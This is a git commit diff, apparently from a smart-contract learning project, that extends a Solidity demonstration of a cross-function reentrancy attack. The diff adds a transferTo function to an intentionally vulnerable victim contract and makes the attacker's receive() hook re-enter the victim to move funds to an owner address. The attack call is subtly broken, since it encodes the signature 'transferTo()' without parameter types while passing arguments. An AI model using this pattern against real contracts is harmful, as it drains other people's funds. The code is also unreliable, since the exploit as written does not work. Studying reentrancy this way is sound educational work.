a7f45d153ceb225e297820b7595d474201c303ea
NilsonKr <nuotrok444@gmail.com>
2022-04-10 14:24:23 -0500

    :sparkles: Cross-Reentrancy attack contract

--- contracts/transferences/CrossReentrancy.sol
+++ contracts/transferences/CrossReentrancy.sol
@@ -14,22 +14,36 @@ contract ReentrancyVictim {
 
      balances[msg.sender] = 0;
   }
+
+
+  function transferTo (address destiny, uint256 ammount ) external {
+      if(balances[msg.sender] >= ammount){
+        balances[msg.sender] -= ammount;
+        balances[destiny] += ammount;
+      }
+  }
 }
 
 
 //Recursive call to the function in order to empty the contracts funds
 contract AttackContract {
   address private victimContract;
+  address private owner;
 
-  constructor(address _victimContract) {
+  constructor(address _victimContract, address _owner) {
     victimContract = _victimContract;
+    owner = _owner;
   }
 
   receive() external payable {
-    victimContract.call(abi.encodeWithSignature("withdrawal()"));
+    //Call another function in the external contract 
+    //In order to get a unexpected behavior
+    victimContract.call(abi.encodeWithSignature("transferTo()", owner, msg.value));
   }
 }
 
+//Prevention for a reentrancy attack, do not update the state after a transfer
+//Set a limit gas to operate
 
 contract SafeReentrancy {
   mapping (address => uint256)  private balances;
